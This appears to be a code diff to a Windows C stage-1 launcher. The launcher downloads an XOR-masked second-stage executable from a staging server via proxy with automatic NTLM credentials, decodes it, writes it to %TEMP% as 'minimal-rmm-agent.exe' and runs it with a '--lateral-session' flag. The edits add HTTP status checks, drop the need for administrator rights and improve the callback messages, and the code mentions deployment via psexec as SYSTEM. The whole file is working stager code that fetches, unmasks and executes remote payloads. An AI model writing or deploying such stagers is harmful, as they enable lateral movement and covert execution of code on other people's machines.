@@ -23,9 +23,10 @@
  *   1. GET {BASE_URL}/tools/stage/{staging_id}
  *      - System/IE proxy  (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY)
  *      - NTLM proxy auth  (WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW)
+ *      - HTTP 200 required; anything else is a clear error, not a payload
  *   2. XOR-decode with SHA-256 counter keystream seeded by staging_id
  *   3. Verify MZ header
- *   4. Write to %SystemRoot%\System32\minimal-rmm-agent.exe
+ *   4. Write to %TEMP%\minimal-rmm-agent.exe (user-writable, no elevation)
  *   5. CreateProcessW detached: minimal-rmm-agent.exe --lateral-session <id>
  *   6. POST status back to staging endpoint
  */
@@ -183,7 +184,8 @@ static BOOL crackURL(const wchar_t *url,
 }
 
 /* Send an HTTP request and return the response body in a HeapAlloc'd buffer.
- * *outLen receives the byte count.  Returns NULL on error. */
+ * *outLen receives the byte count and *outStatus the HTTP status code.
+ * Returns NULL on transport failure. */
 static BYTE *httpRequest(HINTERNET hSession,
                          const wchar_t *host, INTERNET_PORT port,
                          DWORD secFlag,
@@ -191,7 +193,8 @@ static BYTE *httpRequest(HINTERNET hSession,
                          const wchar_t *path,
                          const void *body, DWORD bodyLen,
                          const wchar_t *contentType,
-                         DWORD *outLen) {
+                         DWORD *outLen, DWORD *outStatus) {
+    *outStatus = 0;
     HINTERNET hConn = WinHttpConnect(hSession, host, port, 0);
     if (!hConn) return NULL;
 
@@ -224,6 +227,16 @@ static BYTE *httpRequest(HINTERNET hSession,
         WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
         return NULL;
     }
+
+    /* Record the HTTP status so callers can reject error pages instead of
+     * trying to decode them as the stage2 payload. */
+    DWORD statusCode = 0, statusSize = sizeof(statusCode);
+    WinHttpQueryHeaders(hReq,
+                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                        WINHTTP_HEADER_NAME_BY_INDEX,
+                        &statusCode, &statusSize,
+                        WINHTTP_NO_HEADER_INDEX);
+    *outStatus = statusCode;
 
     /* Read response body into a growable HeapAlloc buffer */
     DWORD cap = 65536, used = 0;
@@ -268,12 +281,12 @@ static void reportStatus(HINTERNET hSession,
                          const wchar_t *stagePath,
                          const char *msg) {
     DWORD msgLen = lstrlenA(msg);
-    DWORD dummy;
+    DWORD dummy, statusDummy;
     BYTE *resp = httpRequest(hSession, host, port, secFlag,
                              L"POST", stagePath,
                              msg, msgLen,
                              L"Content-Type: text/plain; charset=utf-8",
-                             &dummy);
+                             &dummy, &statusDummy);
     if (resp) HeapFree(GetProcessHeap(), 0, resp);
 }
 
@@ -288,12 +301,18 @@ static const char *doStage(HINTERNET hSession,
                             const wchar_t *stageIDW,
                             const wchar_t *sessionIDW) {
     /* 1. Fetch the masked stage2 payload */
-    DWORD payloadLen = 0;
+    DWORD payloadLen = 0, httpStatus = 0;
     BYTE *payload = httpRequest(hSession, host, port, secFlag,
                                 L"GET", stagePath,
                                 NULL, 0, NULL,
-                                &payloadLen);
+                                &payloadLen, &httpStatus);
     if (!payload) return "stage2 download failed";
+    if (httpStatus != 200) {
+        HeapFree(GetProcessHeap(), 0, payload);
+        if (httpStatus == 404)
+            return "stage2 download failed: HTTP 404 (staging entry unknown, already fetched, or expired)";
+        return "stage2 download failed: HTTP status not 200";
+    }
     if (payloadLen < 2) { HeapFree(GetProcessHeap(), 0, payload); return "stage2 payload empty"; }
 
     /* 2. Decode: XOR with SHA-256 counter keystream */
@@ -313,13 +332,16 @@ static const char *doStage(HINTERNET hSession,
         return "stage2 integrity check failed (not MZ)";
     }
 
-    /* 4. Write to %SystemRoot%\System32\minimal-rmm-agent.exe */
-    wchar_t sysRoot[MAX_PATH] = L"C:\\Windows";
-    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+    /* 4. Write to %TEMP%\minimal-rmm-agent.exe — user-writable, so a manual
+     * launcher run needs no administrator rights (the psexec path runs as
+     * SYSTEM, whose temp directory is writable as well). */
+    wchar_t tmpDir[MAX_PATH];
+    if (!GetTempPathW(MAX_PATH, tmpDir))
+        lstrcpyW(tmpDir, L"C:\\Windows\\Temp\\");
 
     wchar_t agentPath[MAX_PATH];
-    lstrcpyW(agentPath, sysRoot);
-    lstrcatW(agentPath, L"\\System32\\minimal-rmm-agent.exe");
+    lstrcpyW(agentPath, tmpDir);
+    lstrcatW(agentPath, L"minimal-rmm-agent.exe");
 
     HANDLE hFile = CreateFileW(agentPath,
                                GENERIC_WRITE, 0, NULL,
@@ -418,8 +440,14 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
 
     const char *err = doStage(hSession, host, port, secFlag,
                                stagePath, stageID, sessionID);
-    reportStatus(hSession, host, port, secFlag, stagePath,
-                 err ? err : "ok: agent installed and started");
+    char statusMsg[320];
+    if (err) {
+        lstrcpyA(statusMsg, "stage1 failed: ");
+        lstrcatA(statusMsg, err);
+    } else {
+        lstrcpyA(statusMsg, "stage1 ok: agent installed and started");
+    }
+    reportStatus(hSession, host, port, secFlag, stagePath, statusMsg);
     WinHttpCloseHandle(hSession);
     return err ? 1 : 0;
 }
